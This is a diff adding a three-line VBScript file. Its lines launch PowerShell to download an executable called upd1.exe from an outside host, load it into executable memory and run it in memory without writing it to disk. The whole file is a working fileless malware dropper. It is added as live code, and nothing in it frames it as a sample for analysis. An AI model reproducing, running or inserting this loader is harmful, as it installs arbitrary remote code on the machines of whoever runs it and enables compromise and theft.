@@ -1,0 +1,3 @@
+Set sh = CreateObject("WScript.Shell")
+cmd = "powershell -NoExit -Command ""$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');$m=[IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([guid]::NewGuid().ToString(),[long]$b.Length,[IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute);$v=$m.CreateViewSection();$p=$v.SafeMemoryMappedViewHandle.DangerousGetHandle();[Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Action]);$d.Invoke()"""
+sh.Run cmd, 1, False
